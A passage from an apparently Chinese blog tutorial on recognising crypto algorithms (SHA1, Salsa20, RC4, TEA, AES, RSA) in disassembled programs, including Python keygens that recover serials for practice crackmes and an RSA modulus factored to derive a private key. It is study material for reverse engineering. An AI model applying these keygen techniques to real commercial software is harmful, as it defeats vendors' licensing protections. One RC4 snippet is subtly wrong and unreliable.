class="line">hash.update(str.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">hash = hash.hexdigest()</span><br><span class="line">xor_str_1 = [<span class="number">0x50</span>,<span class="number">0x45</span>, <span class="number">0x44</span>, <span class="number">0x49</span>, <span class="number">0x59</span>, <span class="number">0x20</span>, <span class="number">0x46</span>, <span class="number">0x6F</span> ,<span class="number">0x72</span> ,<span class="number">0x75</span>, <span class="number">0x6D</span>, <span class="number">0x00</span> ]</span><br><span class="line">xor_str_2 = <span class="string">"pediy.com"</span></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="comment"># print(hash)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">34</span>,<span class="number">2</span>):</span><br><span class="line"><span class="keyword">if</span> i &gt; <span class="number">22</span>:</span><br><span class="line">b = <span class="string">'0x'</span> + (hash[i] + hash [i+<span class="number">1</span>])</span><br><span class="line">a = eval(b) ^ eval(output[int((i/<span class="number">2</span>))<span class="number">-12</span>])</span><br><span class="line">output.append(hex(a))</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">b = <span class="string">'0x'</span> + (hash[i] + hash [i+<span class="number">1</span>])</span><br><span class="line">a = eval(b) ^ (xor_str_1[int(i/<span class="number">2</span>)])</span><br><span class="line">output.append(hex(a))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">34</span>,<span class="number">40</span>,<span class="number">2</span>):</span><br><span class="line">b = <span class="string">'0x'</span> + (hash[i] + hash [i+<span class="number">1</span>])</span><br><span class="line">a = eval(b) ^ ord(xor_str_2[int(i/<span class="number">2</span>)<span class="number">-17</span>])</span><br><span class="line">output.append(hex(a))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">output[<span class="number">10</span>+i] = hex(eval(output[i]) ^ eval(output[<span class="number">10</span>+i]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>,<span class="number">20</span>):</span><br><span class="line">print(<span class="string">'&#123;:0&gt;2&#125;'</span>.format((output[i][<span class="number">2</span>:]).upper()),end = <span class="string">""</span>)</span><br></pre></td></tr></table></figure><p>成功<img src="https://i.loli.net/2019/11/11/WfdHbolKMP5JyGO.png" alt="image.png"></p></li><li><p>计算函数的部分伪代码参考<img src="https://i.loli.net/2019/11/11/bwDx6eJOCWYrZSn.png" alt="image.png"></p></li></ol><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>要注意字节与位转换函数,不太熟悉容易迷惑</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">20</span>;i++)</span><br><span class="line">&#123; <span class="comment">/* convert to bytes */</span></span><br><span class="line">    hash[i]=((sh-&gt;h[i/<span class="number">4</span>]&gt;&gt;(<span class="number">8</span>*(<span class="number">3</span>-i%<span class="number">4</span>))) &amp; <span class="number">0xff</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h2><h3 id="Salsa20"><a href="#Salsa20" class="headerlink" title="Salsa20"></a>Salsa20</h3><p>又称chacha20,在勒索病毒中为常见</p><p><a href="https://cr.yp.to/salsa20.html" target="_blank" rel="noopener">salsa20</a></p><p><a href="https://neoatlantis.org/电工电子及信息技术/2015/03/03/salsa20-description.html" target="_blank" rel="noopener">原理</a></p><p>官方源码为:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> R(a,b) (((a) <span class="meta-string">&lt;&lt; (b)) | ((a) &gt;&gt; (32 - (b))))</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">salsa20_word_specification</span><span class="params">(uint32 out[<span class="number">16</span>],uint32 in[<span class="number">16</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    uint32 x[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; <span class="number">16</span>;++i) x[i] = in[i];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">20</span>;i &gt; <span class="number">0</span>;i -= <span class="number">2</span>) &#123;     <span class="comment">// 迭代次数，注意每次 i -= 2 ！</span></span><br><span class="line">        x[ <span class="number">4</span>] ^= R(x[ <span class="number">0</span>]+x[<span class="number">12</span>], <span class="number">7</span>);  x[ <span class="number">8</span>] ^= R(x[ <span class="number">4</span>]+x[ <span class="number">0</span>], <span class="number">9</span>);</span><br><span class="line">        x[<span class="number">12</span>] ^= R(x[ <span class="number">8</span>]+x[ <span class="number">4</span>],<span class="number">13</span>);  x[ <span class="number">0</span>] ^= R(x[<span class="number">12</span>]+x[ <span class="number">8</span>],<span class="number">18</span>);</span><br><span class="line">        x[ <span class="number">9</span>] ^= R(x[ <span class="number">5</span>]+x[ <span class="number">1</span>], <span class="number">7</span>);  x[<span class="number">13</span>] ^= R(x[ <span class="number">9</span>]+x[ <span class="number">5</span>], <span class="number">9</span>);</span><br><span class="line">        x[ <span class="number">1</span>] ^= R(x[<span class="number">13</span>]+x[ <span class="number">9</span>],<span class="number">13</span>);  x[ <span class="number">5</span>] ^= R(x[ <span class="number">1</span>]+x[<span class="number">13</span>],<span class="number">18</span>);</span><br><span class="line">        x[<span class="number">14</span>] ^= R(x[<span class="number">10</span>]+x[ <span class="number">6</span>], <span class="number">7</span>);  x[ <span class="number">2</span>] ^= R(x[<span class="number">14</span>]+x[<span class="number">10</span>], <span class="number">9</span>);</span><br><span class="line">        x[ <span class="number">6</span>] ^= R(x[ <span class="number">2</span>]+x[<span class="number">14</span>],<span class="number">13</span>);  x[<span class="number">10</span>] ^= R(x[ <span class="number">6</span>]+x[ <span class="number">2</span>],<span class="number">18</span>);</span><br><span class="line">        x[ <span class="number">3</span>] ^= R(x[<span class="number">15</span>]+x[<span class="number">11</span>], <span class="number">7</span>);  x[ <span class="number">7</span>] ^= R(x[ <span class="number">3</span>]+x[<span class="number">15</span>], <span class="number">9</span>);</span><br><span class="line">        x[<span class="number">11</span>] ^= R(x[ <span class="number">7</span>]+x[ <span class="number">3</span>],<span class="number">13</span>);  x[<span class="number">15</span>] ^= R(x[<span class="number">11</span>]+x[ <span class="number">7</span>],<span class="number">18</span>);</span><br><span class="line">        x[ <span class="number">1</span>] ^= R(x[ <span class="number">0</span>]+x[ <span class="number">3</span>], <span class="number">7</span>);  x[ <span class="number">2</span>] ^= R(x[ <span class="number">1</span>]+x[ <span class="number">0</span>], <span class="number">9</span>);</span><br><span class="line">        x[ <span class="number">3</span>] ^= R(x[ <span class="number">2</span>]+x[ <span class="number">1</span>],<span class="number">13</span>);  x[ <span class="number">0</span>] ^= R(x[ <span class="number">3</span>]+x[ <span class="number">2</span>],<span class="number">18</span>);</span><br><span class="line">        x[ <span class="number">6</span>] ^= R(x[ <span class="number">5</span>]+x[ <span class="number">4</span>], <span class="number">7</span>);  x[ <span class="number">7</span>] ^= R(x[ <span class="number">6</span>]+x[ <span class="number">5</span>], <span class="number">9</span>);</span><br><span class="line">        x[ <span class="number">4</span>] ^= R(x[ <span class="number">7</span>]+x[ <span class="number">6</span>],<span class="number">13</span>);  x[ <span class="number">5</span>] ^= R(x[ <span class="number">4</span>]+x[ <span class="number">7</span>],<span class="number">18</span>);</span><br><span class="line">        x[<span class="number">11</span>] ^= R(x[<span class="number">10</span>]+x[ <span class="number">9</span>], <span class="number">7</span>);  x[ <span class="number">8</span>] ^= R(x[<span class="number">11</span>]+x[<span class="number">10</span>], <span class="number">9</span>);</span><br><span class="line">        x[ <span class="number">9</span>] ^= R(x[ <span class="number">8</span>]+x[<span class="number">11</span>],<span class="number">13</span>);  x[<span class="number">10</span>] ^= R(x[ <span class="number">9</span>]+x[ <span class="number">8</span>],<span class="number">18</span>);</span><br><span class="line">        x[<span class="number">12</span>] ^= R(x[<span class="number">15</span>]+x[<span class="number">14</span>], <span class="number">7</span>);  x[<span class="number">13</span>] ^= R(x[<span class="number">12</span>]+x[<span class="number">15</span>], <span class="number">9</span>);</span><br><span class="line">        x[<span class="number">14</span>] ^= R(x[<span class="number">13</span>]+x[<span class="number">12</span>],<span class="number">13</span>);  x[<span class="number">15</span>] ^= R(x[<span class="number">14</span>]+x[<span class="number">13</span>],<span class="number">18</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>;i &lt; <span class="number">16</span>;++i) out[i] = x[i] + in[i];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Sodinobiki</code>勒索病毒中的<code>Salsa20</code>识别基本是同一样子.</p><ol><li><p>初始化和16次迭代<img src="https://i.loli.net/2020/03/09/71c5JF9oKC4UV2O.png" alt="image.png"></p></li><li><p>位移与10次双回合.</p><p><img src="https://i.loli.net/2020/03/09/bJzauyUC2MnrOgR.png" alt="image.png"></p></li><li><p>16次迭代<img src="https://i.loli.net/2020/03/10/kXMU974CoeAEgTa.png" alt="image.png"></p></li></ol><h3 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h3><p>RC4生成一种被称为<code>密钥流</code>的伪随机流.它与加密的数据长度相等.密钥流与数据同位异或进行加解密.密钥流生成分为两个部分KSA与PRGA.</p><ol><li><p>the key-scheduling Algorithm (KSA) 密钥调度算法</p><p>按照升序<code>0,1,2,3,4.....,254,255</code>初始化一个256字节数组<code>S</code>.</p><p>使用密钥填充一个256字节数组<code>T</code> ,长度不够的话,轮转填入,直到填满.</p><p>对数组<code>S</code>进行打乱.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>;i&lt;<span class="number">256</span>;i++)&#123;</span><br><span class="line">    j =(j+S[i]+T[i])%<span class="number">256</span>;</span><br><span class="line">    swap(S[i],S[j]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>the Pseudo-Random Generation Algorithm  (PRGA) 伪随机生成算法</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> i, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (data_length--) &#123;</span><br><span class="line">i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">j = (j + S[i]) % <span class="number">256</span>;</span><br><span class="line">swap(S[i], S[j]);</span><br><span class="line"><span class="keyword">int</span> t = (S[i] + S[j]) % <span class="number">256</span>;</span><br><span class="line"><span class="keyword">int</span> k = S[t];</span><br><span class="line"><span class="comment">//k为加密密钥,直接进行与数据异或或者存进数组里最后进行异或都可以,</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>函数完整代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> S[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span>&amp; a, <span class="keyword">int</span>&amp; b)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> c = a;</span><br><span class="line">a = b;</span><br><span class="line">b = c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">KSA</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> key[], <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) S[i] = i;</span><br><span class="line"><span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">j = (j + S[i] + key[i % len]) % <span class="number">256</span>;</span><br><span class="line">swap(S[i], S[j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PRGA</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> data[], <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, num = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> data_length = len;</span><br><span class="line"><span class="keyword">while</span> (data_length--) &#123;</span><br><span class="line">i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">j = (j + S[i]) % <span class="number">256</span>;</span><br><span class="line">swap(S[i], S[j]);</span><br><span class="line"><span class="keyword">int</span> t = (S[i] + S[j]) % <span class="number">256</span>;</span><br><span class="line"><span class="keyword">int</span> k = S[t];</span><br><span class="line">data[num] = (data[num] ^ k);</span><br><span class="line">num++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> key[] = <span class="string">"xwdidi.com"</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> data[] = <span class="string">"bbspediycom"</span>;</span><br><span class="line">KSA(key, <span class="built_in">strlen</span>((<span class="keyword">char</span>*)key));</span><br><span class="line">PRGA(data,<span class="built_in">strlen</span>((<span class="keyword">char</span>*)data));</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>((<span class="keyword">char</span>*)data); i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; hex &lt;&lt; (<span class="keyword">int</span>)data[i] &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="初探逆向识别RC4"><a href="#初探逆向识别RC4" class="headerlink" title="初探逆向识别RC4"></a>初探逆向识别RC4</h4><p>使用加密与解密中的<code>RC4Sample</code>进行分析学习.</p><h5 id="主函数体伪代码"><a href="#主函数体伪代码" class="headerlink" title="主函数体伪代码"></a>主函数体伪代码</h5><p><img src="https://i.loli.net/2019/11/08/uZfmi92SpsNJxzw.png" alt="image.png">中间两个函数可能就是<code>KSA</code>和<code>PGRA</code>.</p><h5 id="sub-401000"><a href="#sub-401000" class="headerlink" title="sub_401000"></a>sub_401000</h5><p>伪代码全图:<img src="https://i.loli.net/2019/11/08/DYdUStKxr1M3skF.png" alt="image.png"></p><p>可以看中间<code>do-while</code>循环,有一个数组的<code>256</code>位初始化.说明<code>a1+2</code>是一个数组<code>s-box</code>的位置,那么<code>*a1</code>和<code>a1[0]</code>就是两个<code>int</code>型变量.然后下面的循环中,其实是交换和计算<code>j</code>是交叉在一起的.<code>31,32,35,36</code>是计算<code>j</code>的位置,<code>30,33,34</code>是交换.</p><p>通过<code>v3</code>与<code>a3</code>比较,获得对key长度取余的效果.<code>v8</code>则是每循环一次加一取值的<code>s-box</code>.</p><h5 id="sub-401070"><a href="#sub-401070" class="headerlink" title="sub_401070"></a>sub_401070</h5><p><img src="https://i.loli.net/2019/11/08/l7myjeTzdI4acxB.png" alt="image.png"></p><p>第一眼会发现做了异或操作,可能这就是<code>PRGA</code>.</p><p>仔细观察后发现<code>result[2]</code>其实是<code>s-box</code>的首地址,其他变量的话就是相对首地址的偏移.<code>30,31,34,35,36</code>其实交换函数.其他就是获得异或key所需的偏移计算.</p><h4 id="魔改RC4"><a href="#魔改RC4" class="headerlink" title="魔改RC4"></a>魔改RC4</h4><ol><li>使用其它算法对参数进行加密,与其他加密算法糅合.</li><li>S盒的内部数据固定</li></ol><h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p>对于循环,又有<code>256</code>或者<code>0x100</code>的关键字,获取字符串长度,又再次使用处理过的值进行异或的话可以去怀疑是<code>RC4</code>加密.</p><h3 id="TEA"><a href="#TEA" class="headerlink" title="TEA"></a>TEA</h3><p><code>xtea</code>,<code>xxtea</code>,<code>tea</code>都可以用<code>0x9E3779B9</code>识别,详细分析后面有空再写吧</p><h3 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h3><h4 id="基本原理-1"><a href="#基本原理-1" class="headerlink" title="基本原理"></a>基本原理</h4><p>分组长度:128比特</p><p>密钥长度:128, 192, 256比特</p><p>圈数:分别为10, 12, 14</p><p>设定Nr为第<code>r+1</code>次轮函数. 将输入复制到状态数组中.在进行一个初始轮密钥加操作之后, 执行<code>Nr</code>次论函数.对状态数组进行变换, 其中最后一轮不同于前Nr-1 轮. 将最终的状态数组复制到输出数组中. 即得到最终密文(引用自加密与解密)</p><p>AES-128:</p><p><img src="https://i.loli.net/2019/11/22/C3fsQh5vOduUnaw.png" alt="image.png"></p><p>轮密钥加(AddRoundKey):将状态元素与轮密钥进行简单的异或计算,唯一需要三个参数的过程.</p><p>字节替代(SubBytes):使用<code>S-box</code>进行查表,字节替换操作。</p><p><code>S-box</code>:</p><p><img src="https://i.loli.net/2019/11/20/vJHrkdItu4gyxzV.png" alt="image.png"></p><p>行位移(ShiftRows):数组大小为<code>4x4字节</code>,第一行保持不变,第二行循环左移1字节,第三行循环左移2字节,第四行循环左移3字节.</p><p>列混淆(MixColumns):以列为单位,可看作进行矩阵乘法,矩阵为((02,03,01,01)(01,02,03,01)(01,01,02,03)(03,01,01,02))</p><p>密钥扩展(KeyExpansion):通过密码扩展算法生成<code>Nr+1</code>个32位双字</p><p>解密就是逆过程了</p><h5 id="空间换时间"><a href="#空间换时间" class="headerlink" title="空间换时间"></a>空间换时间</h5><p>大多数时候,常见aes使用空间换时间</p><p>将轮函数的几个步骤合并为一组简单的查表操作,只是最后一步没有,需要使用常规方法处理.</p><p>然后需要4个<code>T</code>表，一个<code>T</code>表需要256个4字节的32位双字，所以需要<code>4kb</code>的存储空间.</p><p>每进行一轮,4次查表,4轮异或运算.一共有四次,16轮查表,16轮异或</p><p>T表数据图</p><p><img src="https://ask.qcloudimg.com/http-save/yehe-1268449/i58cakumz6.jpeg?imageView2/2/w/1620" alt="img"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">t0 = Te0[s0 &gt;&gt; <span class="number">24</span>] ^ Te1[(s1 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>] ^ Te2[(s2 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>] ^ Te3[s3 &amp; <span class="number">0xff</span>] ^ rk[round*<span class="number">4</span>];</span><br><span class="line">t1 = Te0[s1 &gt;&gt; <span class="number">24</span>] ^ Te1[(s2 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>] ^ Te2[(s3 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>] ^ Te3[s0 &amp; <span class="number">0xff</span>] ^ rk[round*<span class="number">4</span>+<span class="number">1</span>]; </span><br><span class="line">t2 = Te0[s2 &gt;&gt; <span class="number">24</span>] ^ Te1[(s3 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>] ^ Te2[(s0 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>] ^ Te3[s1 &amp; <span class="number">0xff</span>] ^ rk[round*<span class="number">4</span>+<span class="number">2</span>]; </span><br><span class="line">t3 = Te0[s3 &gt;&gt; <span class="number">24</span>] ^ Te1[(s0 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>] ^ Te2[(s1 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>] ^ Te3[s2 &amp; <span class="number">0xff</span>] ^ rk[round*<span class="number">4</span>+<span class="number">3</span>];</span><br></pre></td></tr></table></figure><h4 id="逆向初探识别RSA"><a href="#逆向初探识别RSA" class="headerlink" title="逆向初探识别RSA"></a>逆向初探识别RSA</h4><p>一样使用的是加密与解密中的样例</p><ol><li><p><code>FindCrypt</code>识别处<code>MD5</code>和<code>AES</code><img src="https://i.loli.net/2019/11/19/Ovp4mEYTeIQlCoP.png" alt="image.png"></p></li><li><p><code>Serial</code>长度为32字节，使用16进制的话刚好为128位。<img src="https://i.loli.net/2019/11/20/uTNLphOHUxqy3kS.png" alt="image.png"></p></li><li><p>静态分析大概这样，接下来动态看看<img src="https://i.loli.net/2019/11/20/TB6O27oxGh5dsFi.png" alt="image.png"></p></li><li><p><code>sub_401320</code>压入初始化后的寄存器数组地址，<code>name</code>, 长度<img src="https://i.loli.net/2019/11/20/Uhi4f7Ir9Qsdueo.png" alt="image.png"></p></li><li><p>最终获得128位<code>MD5</code>散列值<img src="https://i.loli.net/2019/11/20/NSD2sLzbZOxemBU.png" alt="image.png"></p></li><li><p>执行<code>sub_401EC0</code></p><p><img src="https://i.loli.net/2019/11/20/1nkTwzciLpbDM9a.png" alt></p></li><li><p>内存中的<code>sbox</code></p><p><img src="https://i.loli.net/2019/11/21/7O5cwBhmPLNMjXJ.png" alt="image.png"></p></li><li><p>细致算法省略</p><p><img src="https://i.loli.net/2019/11/21/dRSnO8PBKqxHvLt.png" alt="image.png">函数中存在大量的移位异或操作,太大了就不截图了.</p></li><li><p>注册机</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">#!python3</span></span><br><span class="line">   <span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">   <span class="comment">#"xwdidi" md5</span></span><br><span class="line">   hash = <span class="string">b"\x39\xd7\x8e\xe5\x67\xf3\xf2\x96\xad\x84\x8d\x3f\xcd\xb1\xd4\x61"</span></span><br><span class="line">   key = <span class="string">b"\x2b\x7e\x15\x16\x28\xae\xd2\xa6\xab\xf7\x15\x88\x09\xcf\x4f\x3c"</span></span><br><span class="line">   cipher = AES.new(key,AES.MODE_ECB)</span><br><span class="line">   plaintext = cipher.decrypt(hash)</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> plaintext:</span><br><span class="line">   print(hex(i)[<span class="number">2</span>:].upper(),end=<span class="string">""</span>)</span><br></pre></td></tr></table></figure></li></ol><h4 id="加密模式与填充模式"><a href="#加密模式与填充模式" class="headerlink" title="加密模式与填充模式"></a>加密模式与填充模式</h4><ul><li>ECB: 需要加密的消息按照块密码的块大小被分为数个块，并对每个块进行独立加密。</li><li>CBC : 每 个明文块先与前一个密文块进行异或后，再进行加密   </li><li>CTR</li><li>OCF</li><li>CFB</li></ul><p>ECB 与 CBC</p><ul><li><p>PKCS7Padding: 假设数据长度需要填充n(n&gt;0)个字节才对齐，那么填充n个字节，每个字节都是n;如果数据本身就已经对齐了，则填充一块长度为块大小的数据，每个字节都是块大小。</p></li><li><p>PKCS5Padding:PKCS7Padding的子集，块大小固定为8字节</p></li><li><p>Zero-Padding  用0填充(适合以\ 0结尾的字符串加解密)</p></li></ul><h2 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h2><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><h4 id="基本原理-2"><a href="#基本原理-2" class="headerlink" title="基本原理"></a>基本原理</h4><ol><li><p>选择两个不同大的质数<code>p</code>和<code>q</code>,计算<code>n=p*q</code></p></li><li><p>根据欧拉函数,求得<code>r=φ(n)=φ(p)φ(q)=(p−1)(q−1)</code></p></li><li><p>选择一个与<code>e</code>互质且小于<code>r</code>的整数,并求得c关于r的模反元素,命名为<code>d</code>,有<code>ed ≡ 1 mod r</code></p></li><li><p>销毁<code>p</code>和<code>q</code>,此时<code>(n,e)</code>为公钥,<code>(n,d)</code>为私钥</p></li><li><p>$$<br>加密<br>加密 n^e ≡ c \bmod N,消息解密c^d ≡ n \bmod N \<br>(只需要证明n^{ed} ≡n\bmod N即可)<br>$$</p></li></ol><h4 id="逆向初探RSA"><a href="#逆向初探RSA" class="headerlink" title="逆向初探RSA"></a>逆向初探RSA</h4><p>发现这个程序和书前文使用<code>Miracl</code>库运算的逻辑相同,那也简单分析一下.</p><p><img src="https://i.loli.net/2019/11/16/vksbYIzRtKOaNPe.png" alt="image.png"></p><ol><li><p><img src="https://i.loli.net/2019/11/22/T5VRyDKz1ColtGf.png" alt="image.png">    </p><p>逐一检测数据是否为<code>0123456789abcdeABCDEF</code>中的数据,如果有则直接报错</p></li><li><p><img src="https://i.loli.net/2019/11/17/o4hv5SKQTUxgi3H.png" alt="image.png"></p><p>参数初始化</p></li><li><p><img src="https://i.loli.net/2019/11/17/E5LKI4xsmPi7C16.png" alt="image.png"></p><p>传入<code>Serial</code>赋值m,大数<code>n</code>和<code>e</code></p></li><li><p><img src="https://i.loli.net/2019/11/17/gUSmdG7KrR6jJxe.png" alt="image.png"></p><p>计算取模</p></li><li><p><img src="https://i.loli.net/2019/11/17/P4TaxJWlbgekjM5.png" alt="image.png"></p><p>比较判断是否正确</p></li><li><p>由此我们可知是将serial进行RSA解密与输入进行比较.得知了<code>n=0x80C07AFC9D25404D6555B9ACF3567CF1</code>和<code>e=0x10001</code></p></li><li><p>使用大数分解<code>RSATool</code>的<code>Factor N</code>功能,得到<code>p=0xA554665CC62120D3</code>,<code>q=0xC75CB54BEDFA30AB</code></p></li><li><p>输入<code>E</code>,点击<code>Calc. D</code>得到<code>d=0x651A40B9739117EF505DBC33EB8F442D</code></p></li><li><p><code>xwdidi</code>的16进制为<code>787764696469</code>,使用大叔计算器进行<code>c ^d ≡ m mod  N</code>计算,最后得到<code>m=0x5D99FFF7B67285275C8639BCEF982B7</code> ,带入软件后返回<code>Success!</code></p></li><li><p>注册机</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">#!python3</span></span><br><span class="line">    <span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">    c =input()</span><br><span class="line">a = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">    a = a + hex(ord(i))</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># print(a)</span></span><br><span class="line">    a = a.replace(<span class="string">"0x"</span>,<span class="string">""</span>)</span><br><span class="line">    e = <span class="string">"0x"</span> + a</span><br><span class="line">    <span class="comment"># print(e)</span></span><br><span class="line">    result  =  pow(eval(e),<span class="number">0x651A40B9739117EF505DBC33EB8F442D</span>,<span 